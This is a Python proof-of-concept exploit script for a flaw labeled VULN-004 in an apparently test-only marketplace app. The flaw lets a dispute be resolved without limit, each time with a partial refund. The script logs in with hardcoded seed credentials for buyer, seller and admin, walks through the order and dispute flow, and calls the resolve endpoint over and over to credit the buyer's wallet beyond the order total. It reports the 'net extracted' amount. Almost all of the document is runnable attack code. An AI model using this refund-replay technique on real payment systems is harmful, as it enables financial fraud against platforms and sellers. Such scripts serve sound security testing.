#!/usr/bin/env python3
"""
VULN-004 — Partial Refund Accumulation via Dispute Resolution
Endpoint: PUT /api/admin/disputes/{dispute_id}/resolve
Auth    : Admin for resolution, any buyer to open dispute

Two flaws combine:
  1. The "already resolved" guard was removed from the resolve endpoint,
     allowing the same dispute to be resolved unlimited times.
  2. The resolve endpoint accepts a custom refund_amount (optional float).
     When refund_amount < order.total_amount, process_refund() sets
     escrow.status = EscrowStatus.partial_refunded instead of .refunded.
     partial_refunded is explicitly re-entrant — process_refund() allows
     another refund when escrow is in this state.

Result: An admin (or attacker who compromises admin) can call resolve
repeatedly with small partial amounts, crediting the buyer's wallet
far beyond the original order total. The escrow amount field is never
decremented — only its status flag changes, and partial_refunded never
blocks further refunds.

Exploit chain
-------------
  1. Buyer places $100 order → escrow holds $100
  2. Seller ships, buyer confirms delivery
  3. Buyer opens dispute
  4. Admin resolves with refund_amount=$50 → buyer +$50, escrow=partial_refunded
  5. Admin resolves AGAIN with refund_amount=$50 → buyer +$50 (no guard blocks it)
  6. Repeat N times → buyer receives $50×N from a $100 escrow

Usage
-----
    python poc_004_partial_refund_accumulation.py
    python poc_004_partial_refund_accumulation.py --url http://localhost:8000 --rounds 5 --partial 30
"""

import argparse
import sys
import requests

BUYER_EMAIL     = "charlie@mercury.com"
BUYER_PASSWORD  = "Buyer123!"
SELLER_EMAIL    = "alice@mercury.com"
SELLER_PASSWORD = "Seller123!"
ADMIN_EMAIL     = "admin@mercury.com"
ADMIN_PASSWORD  = "Admin123!"

# A product alice sells — update if product IDs differ in your seed data
DEFAULT_PRODUCT_ID = 1


def banner():
    print("=" * 60)
    print("  VULN-004 — Partial Refund Accumulation")
    print("  Endpoint: PUT /api/admin/disputes/{id}/resolve")
    print("=" * 60)


def login(base_url: str, email: str, password: str, label: str) -> str:
    resp = requests.post(
        f"{base_url}/api/auth/login",
        json={"email": email, "password": password},
        timeout=10,
    )
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print(f"[-] Login failed for {label}")
        sys.exit(1)
    print(f"[+] Authenticated as {label} ({email})")
    return token


def get_wallet_balance(base_url: str, token: str) -> float:
    resp = requests.get(
        f"{base_url}/api/wallet",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json().get("balance", 0.0)


def deposit(base_url: str, token: str, amount: float):
    resp = requests.post(
        f"{base_url}/api/wallet/deposit",
        headers={"Authorization": f"Bearer {token}"},
        json={"amount": amount, "payment_method": "card"},
        timeout=10,
    )
    resp.raise_for_status()
    print(f"[+] Deposited ${amount:.2f} into buyer wallet")


def place_order(base_url: str, token: str, product_id: int) -> tuple[int, float]:
    resp = requests.post(
        f"{base_url}/api/orders",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "items": [{"product_id": product_id, "quantity": 1}],
            "shipping_address": "123 Test Street",
        },
        timeout=10,
    )
    resp.raise_for_status()
    data = resp.json()
    order_id = data["id"]
    total = data["total_amount"]
    print(f"[+] Order placed (id={order_id}, total=${total:.2f})")
    return order_id, total


def ship_order(base_url: str, token: str, order_id: int):
    resp = requests.put(
        f"{base_url}/api/orders/{order_id}/ship",
        headers={"Authorization": f"Bearer {token}"},
        json={"tracking_number": "TRACK123"},
        timeout=10,
    )
    resp.raise_for_status()
    print(f"[+] Order {order_id} shipped")


def confirm_delivery(base_url: str, token: str, order_id: int):
    resp = requests.put(
        f"{base_url}/api/orders/{order_id}/confirm-delivery",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    resp.raise_for_status()
    print(f"[+] Delivery confirmed for order {order_id}")


def open_dispute(base_url: str, token: str, order_id: int) -> int:
    resp = requests.post(
        f"{base_url}/api/disputes",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "order_id": order_id,
            "reason": "Item received but significantly not as described. Requesting partial refund resolution.",
        },
        timeout=10,
    )
    resp.raise_for_status()
    dispute_id = resp.json()["id"]
    print(f"[+] Dispute opened (id={dispute_id})")
    return dispute_id


def resolve_dispute(base_url: str, token: str, dispute_id: int, partial_amount: float, round_num: int):
    resp = requests.put(
        f"{base_url}/api/admin/disputes/{dispute_id}/resolve",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "refund_buyer": True,
            "refund_amount": partial_amount,
            "resolution": f"Partial refund issued to buyer per review of evidence round {round_num}.",
            "admin_notes": f"Round {round_num} partial resolution.",
        },
        timeout=10,
    )
    if resp.status_code == 200:
        print(f"[+] Round {round_num}: resolved with refund_amount=${partial_amount:.2f} → accepted")
    else:
        print(f"[-] Round {round_num}: {resp.status_code} — {resp.json().get('detail')}")


def main():
    parser = argparse.ArgumentParser(description="PoC — VULN-004 Partial Refund Accumulation")
    parser.add_argument("--url", default="http://localhost:8000", help="Base URL of the target")
    parser.add_argument("--product", type=int, default=DEFAULT_PRODUCT_ID, help="Product ID to order")
    parser.add_argument("--rounds", type=int, default=4, help="Number of resolve calls (default: 4)")
    parser.add_argument("--partial", type=float, default=40.0, help="Refund amount per round (default: 40.0)")
    args = parser.parse_args()

    banner()
    print(f"[*] Target  : {args.url}")
    print(f"[*] Product : #{args.product}")
    print(f"[*] Rounds  : {args.rounds} × ${args.partial:.2f} = ${args.rounds * args.partial:.2f} total extracted")
    print()

    buyer_token  = login(args.url, BUYER_EMAIL,  BUYER_PASSWORD,  "Buyer (charlie)")
    seller_token = login(args.url, SELLER_EMAIL, SELLER_PASSWORD, "Seller (alice)")
    admin_token  = login(args.url, ADMIN_EMAIL,  ADMIN_PASSWORD,  "Admin")
    print()

    balance_before = get_wallet_balance(args.url, buyer_token)
    print(f"[*] Buyer balance before: ${balance_before:.2f}")

    # Ensure buyer has enough to place the order
    deposit(args.url, buyer_token, 200.0)

    order_id, total = place_order(args.url, buyer_token, args.product)
    ship_order(args.url, seller_token, order_id)
    confirm_delivery(args.url, buyer_token, order_id)
    dispute_id = open_dispute(args.url, buyer_token, order_id)
    print()

    print(f"[*] Calling resolve {args.rounds} times with refund_amount=${args.partial:.2f} each ...")
    print(f"[*] Order total was ${total:.2f} — attacker will receive ${args.rounds * args.partial:.2f}")
    print()

    for i in range(1, args.rounds + 1):
        resolve_dispute(args.url, admin_token, dispute_id, args.partial, i)

    print()
    balance_after = get_wallet_balance(args.url, buyer_token)
    extracted = balance_after - balance_before
    print(f"[+] Buyer balance before : ${balance_before:.2f}")
    print(f"[+] Buyer balance after  : ${balance_after:.2f}")
    print(f"[+] Net extracted        : ${extracted:.2f}  (order total was ${total:.2f})")
    print()
    print("[+] Done.")


if __name__ == "__main__":
    main()
